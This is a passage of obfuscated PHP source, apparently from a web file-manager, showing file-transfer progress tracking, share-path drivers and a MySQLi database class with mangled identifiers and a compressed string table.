$†ĞÑÉœ[1832])); Hook::unbind($†ĞÑÉœ[686], array($this, $†ĞÑÉœ[1833])); Hook::unbind($†ĞÑÉœ[692], array($this, $†ĞÑÉœ[1834])); Hook::unbind($†ĞÑÉœ[693], array($this, $†ĞÑÉœ[1835])); Hook::unbind($†ĞÑÉœ[688], array($this, $†ĞÑÉœ[1836])); Hook::unbind($†ĞÑÉœ[690], array($this, $†ĞÑÉœ[1837])); Hook::unbind($†ĞÑÉœ[654], array($this, $†ĞÑÉœ[1838])); Hook::unbind($†ĞÑÉœ[651], array($this, $†ĞÑÉœ[1838])); Hook::unbind($†ĞÑÉœ[656], array($this, $†ĞÑÉœ[1838])); Hook::unbind($†ĞÑÉœ[658], array($this, $†ĞÑÉœ[1838])); Hook::unbind($†ĞÑÉœ[660], array($this, $†ĞÑÉœ[1838])); Hook::unbind($†ĞÑÉœ[1839], array($this, $†ĞÑÉœ[1840])); Hook::unbind($†ĞÑÉœ[676], array($this, $†ĞÑÉœ[1841])); Hook::unbind($†ĞÑÉœ[1842], array($this, $†ĞÑÉœ[1843])); Hook::unbind($†ĞÑÉœ[1844], array($this, $†ĞÑÉœ[1845])); Hook::unbind($†ĞÑÉœ[1846], array($this, $†ĞÑÉœ[1847])); } public function copyMoveStart($ÏÌÚ¼°Ó, $œü€°‹ò, $©Ğâ¼œÒ, $ÕìºÈÉ) { $×Êˆ˜ƒù =& $_SERVER[´‹ô¯Œ]; self::log($×Êˆ˜ƒù[1857] . $œü€°‹ò . $×Êˆ˜ƒù[73] . $ÕìºÈÉ); $î‘’í¶¨ = rtrim(TEMP_FILES, $×Êˆ˜ƒù[8]); if (substr($œü€°‹ò, 0, strlen($î‘’í¶¨)) == $î‘’í¶¨) { return; } if (substr($ÕìºÈÉ, 0, strlen($î‘’í¶¨)) == $î‘’í¶¨) { return; } $Ç‰È”±Ô =& $this->task; $Ç‰È”±Ô[$×Êˆ˜ƒù[1858]] = KodIO::transferType($ÏÌÚ¼°Ó, $©Ğâ¼œÒ); $this->update(); } public function updateAfter() { $ºª´êşÕ =& $_SERVER[´‹ô¯Œ]; $ï„øâê¬ =& $this->task; if (!$ï„øâê¬[$ºª´êşÕ[849]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($ï„øâê¬[$ºª´êşÕ[1858]] == $ºª´êşÕ[1426]) { return; } self::updateTask($ï„øâê¬); } private static function updateTask(&$‘ÔçŠ˜¥) { $Èß³Á¨‚ =& $_SERVER[´‹ô¯Œ]; if ($‘ÔçŠ˜¥[$Èß³Á¨‚[1858]] == $Èß³Á¨‚[1296] || $‘ÔçŠ˜¥[$Èß³Á¨‚[1858]] == $Èß³Á¨‚[110]) { if ($‘ÔçŠ˜¥[$Èß³Á¨‚[1852]]) { $‘ÔçŠ˜¥[$Èß³Á¨‚[1855]] = $‘ÔçŠ˜¥[$Èß³Á¨‚[1854]] + $‘ÔçŠ˜¥[$Èß³Á¨‚[1851]]; } } else { if ($‘ÔçŠ˜¥[$Èß³Á¨‚[1858]] == $Èß³Á¨‚[1427]) { if ($‘ÔçŠ˜¥[$Èß³Á¨‚[1852]] == $Èß³Á¨‚[1296]) { $‘ÔçŠ˜¥[$Èß³Á¨‚[1855]] = $‘ÔçŠ˜¥[$Èß³Á¨‚[1854]] + $‘ÔçŠ˜¥[$Èß³Á¨‚[1851]] * 0.5; } else { if ($‘ÔçŠ˜¥[$Èß³Á¨‚[1852]] == $Èß³Á¨‚[110]) { $‘ÔçŠ˜¥[$Èß³Á¨‚[1855]] = $‘ÔçŠ˜¥[$Èß³Á¨‚[1854]] + $‘ÔçŠ˜¥[$Èß³Á¨‚[1850]] * 0.5 + $‘ÔçŠ˜¥[$Èß³Á¨‚[1851]] * 0.5; } } } } $‘ÔçŠ˜¥[$Èß³Á¨‚[1798]] = $‘ÔçŠ˜¥[$Èß³Á¨‚[1855]] / $‘ÔçŠ˜¥[$Èß³Á¨‚[849]]; if ($‘ÔçŠ˜¥[$Èß³Á¨‚[1798]] > 0) { $½ ¦ª¿ = timeFloat() - $‘ÔçŠ˜¥[$Èß³Á¨‚[1800]] - $‘ÔçŠ˜¥[$Èß³Á¨‚[1803]]; $‘ÔçŠ˜¥[$Èß³Á¨‚[1804]] = $½ ¦ª¿ * (1 - $‘ÔçŠ˜¥[$Èß³Á¨‚[1798]]) / $‘ÔçŠ˜¥[$Èß³Á¨‚[1798]]; } } public function addPath($„æ×‹À©) { $¥¯ü”Éù =& $_SERVER[´‹ô¯Œ]; if (!$„æ×‹À©) { return; } $ïó±é¤ã =& $this->task; $·È×é€î = IO::infoWithChildren($„æ×‹À©); $ Î§¬Ìö = $ïó±é¤ã[$¥¯ü”Éù[1859]] ? $ïó±é¤ã[$¥¯ü”Éù[1859]][$¥¯ü”Éù[1860]] : 0; $ïó±é¤ã[$¥¯ü”Éù[1859]] = array($¥¯ü”Éù[1860] => $ Î§¬Ìö + 1, $¥¯ü”Éù[506] => $·È×é€î[$¥¯ü”Éù[32]], $¥¯ü”Éù[87] => $·È×é€î[$¥¯ü”Éù[87]], $¥¯ü”Éù[596] => $·È×é€î[$¥¯ü”Éù[596]] ? $·È×é€î[$¥¯ü”Éù[596]] : $·È×é€î[$¥¯ü”Éù[87]]); if ($·È×é€î[$¥¯ü”Éù[33]] == $¥¯ü”Éù[233]) { $ïó±é¤ã[$¥¯ü”Éù[1155]] += 1; } else { $ïó±é¤ã[$¥¯ü”Éù[1155]] += $·È×é€î[$¥¯ü”Éù[82]][$¥¯ü”Éù[80]]; if ($·È×é€î[$¥¯ü”Éù[194]]) { $ïó±é¤ã[$¥¯ü”Éù[1155]] += $·È×é€î[$¥¯ü”Éù[82]][$¥¯ü”Éù[81]] + 1; } } $ïó±é¤ã[$¥¯ü”Éù[849]] += $·È×é€î[$¥¯ü”Éù[79]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($­Û®•¶Á) { } public function sourceAddHashEnd($„ù®øìÚ) { } public function sourceAddFileStart($Á•±Êè») { $Äâëªõô =& $_SERVER[´‹ô¯Œ]; $ÅÔºÂœ« =& $this->task; $ÅÔºÂœ«[$Äâëªõô[1850]] = $Á•±Êè»[$Äâëªõô[79]]; $ÅÔºÂœ«[$Äâëªõô[1848]] = $Á•±Êè»[$Äâëªõô[32]]; $ÅÔºÂœ«[$Äâëªõô[1157]] = $Á•±Êè»[$Äâëªõô[32]]; $ÅÔºÂœ«[$Äâëªõô[1861]] = $Á•±Êè»[$Äâëªõô[87]]; $this->update(); } public function sourceAddFileEnd($†ôÛ³¢”) { $ÀÏéï  =& $_SERVER[´‹ô¯Œ]; $‚ÊñùÌ =& $this->task; $‚ÊñùÌ[$ÀÏéï [1855]] += $†ôÛ³¢”[$ÀÏéï [79]]; $‚ÊñùÌ[$ÀÏéï [1861]] = $†ôÛ³¢”[$ÀÏéï [87]]; $this->update(1); } public function copyFileStart($„–³İ, $ÕÕÃîó², $½Î«å’, $Å¶Æí•, $Ğİ™ŒÃß, $™…àËŒŞ) { $æ‹¿ÇÁ‡ =& $_SERVER[´‹ô¯Œ]; $›³Œ‚™“ = $Ğİ™ŒÃß; if ($›³Œ‚™“ == $GLOBALS[$æ‹¿ÇÁ‡[1862]]) { $›³Œ‚™“ = $GLOBALS[$æ‹¿ÇÁ‡[1863]]; } $GLOBALS[$æ‹¿ÇÁ‡[1863]] = $Ğİ™ŒÃß; $GLOBALS[$æ‹¿ÇÁ‡[1862]] = $™…àËŒŞ; $ûöã§òÒ =& $this->task; $ûöã§òÒ[$æ‹¿ÇÁ‡[1848]] = $›³Œ‚™“; $ûöã§òÒ[$æ‹¿ÇÁ‡[1850]] = (int) $„–³İ->size($ÕÕÃîó²); $ûöã§òÒ[$æ‹¿ÇÁ‡[1851]] = 0; $ûöã§òÒ[$æ‹¿ÇÁ‡[1157]] = $æ‹¿ÇÁ‡[12]; $ûöã§òÒ[$æ‹¿ÇÁ‡[1852]] = $æ‹¿ÇÁ‡[12]; $ûöã§òÒ[$æ‹¿ÇÁ‡[1853]] = 0; $©ìÑåú = $ûöã§òÒ[$æ‹¿ÇÁ‡[1850]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($ûöã§òÒ[$æ‹¿ÇÁ‡[487]] . $æ‹¿ÇÁ‡[1864]); if ($©ìÑåú && file_exists(get_path_father($Å¶Æí•))) { Cache::set($ûöã§òÒ[$æ‹¿ÇÁ‡[487]] . $æ‹¿ÇÁ‡[1864], $Å¶Æí•); $ûöã§òÒ[$æ‹¿ÇÁ‡[1821]] = array($æ‹¿ÇÁ‡[1865], $æ‹¿ÇÁ‡[1866]); } $this->update(0, $©ìÑåú); } public static function updateCopyLocalFileSize($óÑÈ¤å) { $¸²É§â† =& $_SERVER[´‹ô¯Œ]; $ê¡åÊÔß = Cache::get($óÑÈ¤å[$¸²É§â†[487]] . $¸²É§â†[1864]); if (!$ê¡åÊÔß || !file_exists($ê¡åÊÔß)) { return $óÑÈ¤å; } $óÑÈ¤å[$¸²É§â†[1851]] = @filesize($ê¡åÊÔß); $óÑÈ¤å[$¸²É§â†[1855]] += $óÑÈ¤å[$¸²É§â†[1851]]; self::updateTask($óÑÈ¤å); return $óÑÈ¤å; } public function copyFileEnd($‰áß©…€, $É£Îã¢, $”öŒæÔ­, $Î¼÷ú£, $â²Ô›Ë—, $ğÊ°¹¼) { $Å¦Ÿ˜ØÆ =& $_SERVER[´‹ô¯Œ]; $÷ÉÏİ¼Ì =& $this->task; $÷ÉÏİ¼Ì[$Å¦Ÿ˜ØÆ[1851]] = $÷ÉÏİ¼Ì[$Å¦Ÿ˜ØÆ[1850]]; $÷ÉÏİ¼Ì[$Å¦Ÿ˜ØÆ[1852]] = $Å¦Ÿ˜ØÆ[12]; unset($÷ÉÏİ¼Ì[$Å¦Ÿ˜ØÆ[1821]]); if ($â²Ô›Ë— == $÷ÉÏİ¼Ì[$Å¦Ÿ˜ØÆ[1848]]) { $÷ÉÏİ¼Ì[$Å¦Ÿ˜ØÆ[1854]] += $÷ÉÏİ¼Ì[$Å¦Ÿ˜ØÆ[1850]]; $÷ÉÏİ¼Ì[$Å¦Ÿ˜ØÆ[1855]] = $÷ÉÏİ¼Ì[$Å¦Ÿ˜ØÆ[1854]]; $›ú¼¦ÌÔ = 1; if (isset($÷ÉÏİ¼Ì[$Å¦Ÿ˜ØÆ[1861]]) && $÷ÉÏİ¼Ì[$Å¦Ÿ˜ØÆ[1861]] == $É£Îã¢) { $›ú¼¦ÌÔ = 0; } $this->update($›ú¼¦ÌÔ); } else { $this->update(); $÷ÉÏİ¼Ì[$Å¦Ÿ˜ØÆ[1851]] = 0; } Cache::remove($÷ÉÏİ¼Ì[$Å¦Ÿ˜ØÆ[487]] . $Å¦Ÿ˜ØÆ[1864]); self::log($Å¦Ÿ˜ØÆ[1867] . $É£Îã¢ . $Å¦Ÿ˜ØÆ[73] . $Î¼÷ú£ . $Å¦Ÿ˜ØÆ[288] . $â²Ô›Ë— . $Å¦Ÿ˜ØÆ[1868] . $÷ÉÏİ¼Ì[$Å¦Ÿ˜ØÆ[1848]]); } public function updateFileEnd($®ôÔÌÆÅ, $óìÁÇšà) { $í› Â¡ü =& $_SERVER[´‹ô¯Œ]; $Âã²»È½ =& $this->task; $Âã²»È½[$í› Â¡ü[1848]] = $®ôÔÌÆÅ; $Âã²»È½[$í› Â¡ü[1850]] = $óìÁÇšà; $Âã²»È½[$í› Â¡ü[1854]] += $óìÁÇšà; $Âã²»È½[$í› Â¡ü[1855]] = $Âã²»È½[$í› Â¡ü[1854]]; $this->update(1); self::log($í› Â¡ü[1869] . $®ôÔÌÆÅ); } public function sourceModelCopy($„åŠ¦ò) { $Çß‰¥—á =& $_SERVER[´‹ô¯Œ]; $Î¶¬«Ù = $„åŠ¦ò[0]; $êÖÇè = $„åŠ¦ò[1]; $¡ÕÒşô¬ =& $this->task; $this->sourceModelCopyFlag = !0; $ŸéñÙ®ª = 0; switch ($Î¶¬«Ù) { case $Çß‰¥—á[652]: $ŸéñÙ®ª = 1; break; case $Çß‰¥—á[655]: $¡ÕÒşô¬[$Çß‰¥—á[1848]] = $êÖÇè[$Çß‰¥—á[32]]; break; case $Çß‰¥—á[657]: $ŸéñÙ®ª = intval($„åŠ¦ò[$Çß‰¥—á[459]] * 0.4); break; case $Çß‰¥—á[659]: $ŸéñÙ®ª = intval($„åŠ¦ò[$Çß‰¥—á[459]] * 0.2); break; case $Çß‰¥—á[661]: $ŸéñÙ®ª = intval($„åŠ¦ò[$Çß‰¥—á[459]] * 0.4); break; } $this->update($ŸéñÙ®ª); $this->sourceModelCopyFlag = !1; } public function sourceRemove($¢æ€ õ›, $óò–ôğ) { $Ê½È³û± =& $_SERVER[´‹ô¯Œ]; $this->sourceModelCopyFlag = !0; $‡ç×µÆª = 1; if (isset($¢æ€ õ›[$Ê½È³û±[82]])) { $‡ç×µÆª = $¢æ€ õ›[$Ê½È³û±[82]][$Ê½È³û±[80]]; $‡ç×µÆª = $‡ç×µÆª + $¢æ€ õ›[$Ê½È³û±[82]][$Ê½È³û±[81]] + 1; } $this->update($‡ç×µÆª); $this->sourceModelCopyFlag = !1; } public function sourceMove($©º•©Ëö) { $this->sourceRemove($©º•©Ëö, !1); } public function curlProgress($ÁÁœ¥¾±, $¾‘Ãª²Ş, $¯ôü¢É, $ªïĞ›”Ğ, $¢•¯¾»™) { $ê®è¨¥“ =& $_SERVER[´‹ô¯Œ]; $ÌŒË¸õÇ =& $this->task; if ($¢•¯¾»™ > 0) { $ÌŒË¸õÇ[$ê®è¨¥“[1157]] = $ê®è¨¥“[1870]; $ÌŒË¸õÇ[$ê®è¨¥“[1852]] = $ê®è¨¥“[110]; if ($ÌŒË¸õÇ[$ê®è¨¥“[1850]]) { $ÌŒË¸õÇ[$ê®è¨¥“[1851]] = $¢•¯¾»™; } if ($ÌŒË¸õÇ[$ê®è¨¥“[1853]]) { $ÌŒË¸õÇ[$ê®è¨¥“[1851]] = $¢•¯¾»™ + $ÌŒË¸õÇ[$ê®è¨¥“[1853]]; } } else { if ($¯ôü¢É > 0) { if ($ÌŒË¸õÇ[$ê®è¨¥“[1850]] == $¾‘Ãª²Ş) { $ÌŒË¸õÇ[$ê®è¨¥“[1851]] = $¯ôü¢É; $ÌŒË¸õÇ[$ê®è¨¥“[1157]] = $ê®è¨¥“[1871]; $ÌŒË¸õÇ[$ê®è¨¥“[1852]] = $ê®è¨¥“[1296]; } } } $this->update(); } public function curlProgressStart($ÓïİÈ»†) { } public function curlProgressEnd($ü’ˆÃğì) { $¡œª¾®¼ =& $_SERVER[´‹ô¯Œ]; $«Œ¡õé¼ =& $this->task; $–¨Äº•¥ = curl_getinfo($ü’ˆÃğì); $µñ”Öö = $–¨Äº•¥[$¡œª¾®¼[1872]]; if ($µñ”Öö == -1) { $µñ”Öö = $–¨Äº•¥[$¡œª¾®¼[1873]]; } if ($«Œ¡õé¼[$¡œª¾®¼[1852]] == $¡œª¾®¼[110] && $µñ”Öö) { $«Œ¡õé¼[$¡œª¾®¼[1853]] += $µñ”Öö; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $¾äƒïÁü =& $_SERVER[´‹ô¯Œ]; $á¿ÑÏ´ =& $this->task; $á¿ÑÏ´[$¾äƒïÁü[1874]] = 1; Hook::bind($¾äƒïÁü[1842], array($this, $¾äƒïÁü[1875])); Hook::bind($¾äƒïÁü[1844], array($this, $¾äƒïÁü[1876])); Hook::bind($¾äƒïÁü[1846], array($this, $¾äƒïÁü[1877])); } protected function endAfter() { $¡ºİÌêµ =& $_SERVER[´‹ô¯Œ]; Hook::unbind($¡ºİÌêµ[1842], array($this, $¡ºİÌêµ[1875])); Hook::unbind($¡ºİÌêµ[1844], array($this, $¡ºİÌêµ[1876])); Hook::unbind($¡ºİÌêµ[1846], array($this, $¡ºİÌêµ[1877])); } public function progressStart($¤©â¯âï) { $ş—Âª§ =& $_SERVER[´‹ô¯Œ]; $È©õÜÏ© = curl_getinfo($¤©â¯âï); self::log($ş—Âª§[1878] . $È©õÜÏ©[$ş—Âª§[385]]); self::valueSet($this->task[$ş—Âª§[487]], $this->task); } public function progressEnd($å¬ú™Ã) { $½õ™æ£³ =& $_SERVER[´‹ô¯Œ]; self::log($½õ™æ£³[1879] . $this->task[$½õ™æ£³[487]]); $this->end(); } public function progress($´›ñÙÊà, $ğ¸±Æ£, $Ç›é«, $±ÌÕ«ÉÏ, $´„¹››à) { $à»¼İÕ =& $_SERVER[´‹ô¯Œ]; $‰£¾õö± =& $this->task; if ($´„¹››à > 0) { $‰£¾õö±[$à»¼İÕ[1155]] = $‰£¾õö±[$à»¼İÕ[1155]] == 0 ? $±ÌÕ«ÉÏ : $‰£¾õö±[$à»¼İÕ[1155]]; $‰£¾õö±[$à»¼İÕ[1797]] = $´„¹››à; } else { if ($Ç›é« > 0) { $‰£¾õö±[$à»¼İÕ[1155]] = $‰£¾õö±[$à»¼İÕ[1155]] == 0 ? $ğ¸±Æ£ : $‰£¾õö±[$à»¼İÕ[1155]]; $‰£¾õö±[$à»¼İÕ[1797]] = $Ç›é«; } } $this->update(); self::log("\x70\x72\x6f\147\x72\145\163\163\x48\x74\x74\160\x3a\x64\157\167\x6e\x3a{$Ç›é«}\57{$ğ¸±Æ£}\73\40\165\160\154\157\x61\144\x3a{$´„¹››à}\57{$±ÌÕ«ÉÏ}\x3b"); } } goto eŞˆ‹ëñÚ; eªĞŒ¸Éİš: class PathDriverDriverShareItem { public function __construct($Ò‚¼”É) { $this->pathParse = $Ò‚¼”É; } public function __call($¥»Öàç›, $§éöä) { $Ã†’Ñ§æ =& $_SERVER[´‹ô¯Œ]; if (method_exists($this, $¥»Öàç›)) { return; } $µÜ¦™– = call_user_func_array(array($Ã†’Ñ§æ[1454], $¥»Öàç›), $§éöä); $Ìš°µØØ = array($Ã†’Ñ§æ[1455], $Ã†’Ñ§æ[1456], $Ã†’Ñ§æ[1457], $Ã†’Ñ§æ[1458], $Ã†’Ñ§æ[635], $Ã†’Ñ§æ[637], $Ã†’Ñ§æ[1459], $Ã†’Ñ§æ[110], $Ã†’Ñ§æ[1460], $Ã†’Ñ§æ[1461]); if (in_array($¥»Öàç›, $Ìš°µØØ)) { $µÜ¦™– = $this->getPathOuter($µÜ¦™–); } return $µÜ¦™–; } public function copy($ˆùÃçˆæ, $ï¥®ò½ù, $ØâÙõÊí = false, $ª¾üåºÏ = false) { return $this->copyMove($ˆùÃçˆæ, $ï¥®ò½ù, $ØâÙõÊí, $_SERVER[´‹ô¯Œ][635], $ª¾üåºÏ); } public function move($©ŞÃÇ€, $öÂï¢í­, $¬±ˆ¿¨‰ = false, $„ãªí™¾ = false) { return $this->copyMove($©ŞÃÇ€, $öÂï¢í­, $¬±ˆ¿¨‰, $_SERVER[´‹ô¯Œ][637], $„ãªí™¾); } private function copyMove($æôŸÆ´Ë, $úÎ£…¡, $œëª£Ş, $öº”Ç”Â, $ƒû««î• = false) { $Êõºóê“ =& $_SERVER[´‹ô¯Œ]; $Ø´ÅĞé = $úÎ£…¡; $ïÃÛ­ = IO::driverMake($úÎ£…¡); if ($ïÃÛ­->pathParse[$Êõºóê“[1247]]) { $úÎ£…¡ = $ïÃÛ­->pathParse[$Êõºóê“[1247]]; } else { $úÎ£…¡ = $Ø´ÅĞé; } $Ôè‘ì±¨ = IO::copyMove($æôŸÆ´Ë, $úÎ£…¡, $œëª£Ş, $öº”Ç”Â, $ƒû««î•); $Ôè‘ì±¨ = $this->getPathOuter($Ôè‘ì±¨); return $Ôè‘ì±¨; } public function pathThis($›‹„ñòé) { return get_path_this($this->pathParse[$_SERVER[´‹ô¯Œ][87]]); } public function pathFather($¾õÑ»»Î) { return get_path_father($this->pathParse[$_SERVER[´‹ô¯Œ][87]]); } public function iconvSystem($’™å°Û) { return $’™å°Û; } protected function infoParse($¸âì¸èà, $ò Ø™«à = false) { $Ã¬‚ø·ì =& $_SERVER[´‹ô¯Œ]; $¢ßÆ¯ƒß = $this->pathParse[$Ã¬‚ø·ì[574]][$Ã¬‚ø·ì[1274]] . $this->pathParse[$Ã¬‚ø·ì[1266]]; if ($ò Ø™«à) { $¨³öäí = IO::infoWithChildren($¢ßÆ¯ƒß); } else { $¨³öäí = IO::info($¢ßÆ¯ƒß); } $ãŞšõê— = $this->pathParse[$Ã¬‚ø·ì[574]]; return Action($Ã¬‚ø·ì[1452])->_shareItemeParse($¨³öäí, $ãŞšõê—); } public function listAll($éËâ³Ã) { $»‰‡§¶ =& $_SERVER[´‹ô¯Œ]; $Òâ”ÙÃÊ = IO::listAll($éËâ³Ã); $á²Ÿ¢Š¤ = rtrim($this->pathParse[$»‰‡§¶[574]][$»‰‡§¶[1274]], $»‰‡§¶[8]); foreach ($Òâ”ÙÃÊ as &$ŞÛ–Ã£¶) { $ŞÛ–Ã£¶[$»‰‡§¶[87]] = $this->pathDriver . $»‰‡§¶[8] . ltrim(substr($ŞÛ–Ã£¶[$»‰‡§¶[87]], strlen($á²Ÿ¢Š¤)), $»‰‡§¶[8]); } unset($ŞÛ–Ã£¶); return $Òâ”ÙÃÊ; } public function listAllSimple($˜î¬Ôôä, $ƒ¾¿» „ = false) { $ã±ŸŞ©² =& $_SERVER[´‹ô¯Œ]; $¼ÃşÕ¹Ÿ = $this->listAll($˜î¬Ôôä); $ŒÍõÛÒµ = $this->pathParse[$ã±ŸŞ©²[507]]; if (trim($ŒÍõÛÒµ, $ã±ŸŞ©²[8]) == trim(get_path_father($ŒÍõÛÒµ), $ã±ŸŞ©²[8])) { $ƒ¾¿» „ = !0; } return IO::init($ã±ŸŞ©²[12])->listAllSimpleMake($¼ÃşÕ¹Ÿ, $ŒÍõÛÒµ, $ƒ¾¿» „); } public function getPathOuter($£„ŞËûÜ) { $¢¹Îö¯… =& $_SERVER[´‹ô¯Œ]; $çÎÙ‹ìö = KodIO::parse($£„ŞËûÜ); if ($çÎÙ‹ìö[$¢¹Îö¯…[33]] == KodIO::KOD_SHARE_ITEM) { return $çÎÙ‹ìö[$¢¹Îö¯…[87]]; } $‹…Ã¬÷ = KodIO::clear($£„ŞËûÜ); $ãÏâ•‰ = KodIO::clear($this->pathParse[$¢¹Îö¯…[574]][$¢¹Îö¯…[1274]]); $ªŸ›û¶Ñ = substr($‹…Ã¬÷, strlen($ãÏâ•‰)); if (substr($‹…Ã¬÷, 0, strlen($ãÏâ•‰)) != $ãÏâ•‰) { return !1; } return $this->pathParse[$¢¹Îö¯…[1267]] . $¢¹Îö¯…[8] . ltrim($ªŸ›û¶Ñ, $¢¹Îö¯…[8]); } public function getType() { $ç˜µ¾ıƒ =& $_SERVER[´‹ô¯Œ]; $å¶¦ƒï = str_replace($ç˜µ¾ıƒ[77], $ç˜µ¾ıƒ[12], get_class($this)); return strtolower($å¶¦ƒï); } public function isOsDriver($»Ü†—ê¶) { return IO::isOsDriver($»Ü†—ê¶); } public function info($‡ö˜­ö) { return $this->infoParse($‡ö˜­ö); } public function infoAuth($éöî²Âí) { return $this->infoParse($éöî²Âí); } public function infoWithChildren($ıÚ·ÒªÅ) { return $this->infoParse($ıÚ·ÒªÅ, !0); } public function infoFull($¨¢ÕÆƒ) { return $this->infoParse($¨¢ÕÆƒ); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($öˆâüŒâ) { $this->pathParse = $öˆâüŒâ; } protected function infoParse($±Êš±´, $Ü¡ô×ä = false) { $¼‘·Ûœ =& $_SERVER[´‹ô¯Œ]; return Action($¼‘·Ûœ[1273])->sharePathInfo($this->pathParse[$¼‘·Ûœ[87]], !0, $Ü¡ô×ä); } public function listPath($ŸˆˆŸÈ…, $‘òİâƒ¦ = false) { $éÏ­áØŞ =& $_SERVER[´‹ô¯Œ]; $˜õó†¨ = IO::listPath($ŸˆˆŸÈ…, $‘òİâƒ¦); if (!$˜õó†¨) { return $˜õó†¨; } if (is_array($˜õó†¨[$éÏ­áØŞ[1453]])) { $Å­‹ŸøÊ = Action($éÏ­áØŞ[1462])->parsePathChildren($˜õó†¨[$éÏ­áØŞ[1453]], array($éÏ­áØŞ[507] => $ŸˆˆŸÈ…)); $˜õó†¨[$éÏ­áØŞ[1453]] = Action($éÏ­áØŞ[1273])->shareItemInfo($Å­‹ŸøÊ); } foreach ($˜õó†¨ as $Ò¡©ºşÉ => $ÖÔ¿â£¹) { if (!in_array($Ò¡©ºşÉ, array($éÏ­áØŞ[86], $éÏ­áØŞ[85]))) { continue; } foreach ($ÖÔ¿â£¹ as $ÅÏíÍ©Ô => $Å­‹ŸøÊ) { $Å­‹ŸøÊ = Action($éÏ­áØŞ[1462])->parsePathChildren($Å­‹ŸøÊ, array($éÏ­áØŞ[507] => $ŸˆˆŸÈ…)); $˜õó†¨[$Ò¡©ºşÉ][$ÅÏíÍ©Ô] = Action($éÏ­áØŞ[1273])->shareItemInfo($Å­‹ŸøÊ); } } return $˜õó†¨; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($ıáÑáİú) { parent::__construct($ıáÑáİú); $this->setSignVersion($_SERVER[´‹ô¯Œ][250]); } } goto A†×‘¾×¢; D¡¡ë‡†µÈ: define($_SERVER[´‹ô¯Œ][0], $_SERVER[´‹ô¯Œ][1]); $_SERVER[ÜûÈ¾…] = explode($_SERVER[´‹ô¯Œ][2], gzinflate(substr($_SERVER[´‹ô¯Œ][3], 10, -8))); function binCheckEq($›²İ, $ù˜ÑèÉ™) { return $›²İ == $ù˜ÑèÉ™; } goto a§´–Ç¦ÙÎ; A¬³ŸõÃ’: class DbMysqli extends Db { public function __construct($ÏÊú¥´ú = '') { $¯ûÂ¥òÈ =& $_SERVER[´‹ô¯Œ]; if (!extension_loaded($¯ûÂ¥òÈ[1004])) { think_exception(think_lang($¯ûÂ¥òÈ[14]) . $¯ûÂ¥òÈ[1005]); } if (!empty($ÏÊú¥´ú)) { $this->config = $ÏÊú¥´ú; if (empty($this->config[$¯ûÂ¥òÈ[17]])) { $this->config[$¯ûÂ¥òÈ[17]] = $¯ûÂ¥òÈ[12]; } } } public function connect($åÀ«ÙËÊ = '', $’È¥¤Áê = 0) { $à¯€¨èı =& $_SERVER[´‹ô¯Œ]; if (!isset($this->linkID[$’È¥¤Áê])) { if (empty($åÀ«ÙËÊ)) { $åÀ«ÙËÊ = $this->config; } $this->linkID[$’È¥¤Áê] = new mysqli($åÀ«ÙËÊ[$à¯€¨èı[978]], $åÀ«ÙËÊ[$à¯€¨èı[980]], $åÀ«ÙËÊ[$à¯€¨èı[981]], $åÀ«ÙËÊ[$à¯€¨èı[21]], $åÀ«ÙËÊ[$à¯€¨èı[979]] ? intval($åÀ«ÙËÊ[$à¯€¨èı[979]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ÄŒ›æø÷ = $this->linkID[$’È¥¤Áê]->server_version; $this->linkID[$’È¥¤Áê]->query($à¯€¨èı[982] . think_config($à¯€¨èı[983]) . $à¯€¨èı[58]); if ($ÄŒ›æø÷ > $à¯€¨èı[984]) { $this->linkID[$’È¥¤Áê]->query($à¯€¨èı[985]); } $this->connected = !0; if (1 != think_config($à¯€¨èı[22])) { unset($this->config); } } return $this->linkID[$’È¥¤Áê]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($ ù¬îĞ) { $¤¤«É©Í =& $_SERVER[´‹ô¯Œ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ ù¬îĞ; if ($this->queryID) { $this->free(); } think_action_status($¤¤«É©Í[23], 1); think_status($¤¤«É©Í[24]); $this->queryID = $this->_linkID->query($ ù¬îĞ); if ($this->_linkID->more_results()) { while (($×¿‰¿¨ = $this->_linkID->next_result()) != NULL) { $×¿‰¿¨->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($Øæëüßà) { $î¨Æİğä =& $_SERVER[´‹ô¯Œ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Øæëüßà; if ($this->queryID) { $this->free(); } think_action_status($î¨Æİğä[25], 1); think_status($î¨Æİğä[24]); $ñÍ¬¯Ú· = $this->_linkID->query($Øæëüßà); $this->debug(); if (!1 === $ñÍ¬¯Ú·) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÎÛÆÊ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ÎÛÆÊ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $áëäğ– = $this->_linkID->rollback(); $this->transTimes = 0; if (!$áëäğ–) { $this->error(); return !1; } } return !0; } private function getAll() { $’èÙÒÂÉ = array(); if ($this->numRows > 0) { for ($şĞêÂœª = 0; $şĞêÂœª < $this->numRows; $şĞêÂœª++) { $’èÙÒÂÉ[$şĞêÂœª] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $’èÙÒÂÉ; } public function getFields($¹¼±«è) { $¤ğÑİ·à =& $_SERVER[´‹ô¯Œ]; $öå‡ÚÍ× = $this->query($¤ğÑİ·à[989] . $this->parseKey($¹¼±«è)); $Íšù¢²È = array(); if ($öå‡ÚÍ×) { foreach ($öå‡ÚÍ× as $ñ„Ø†±Ù => $Óì¹–—Ó) { $Íšù¢²È[$Óì¹–—Ó[$¤ğÑİ·à[31]]] = 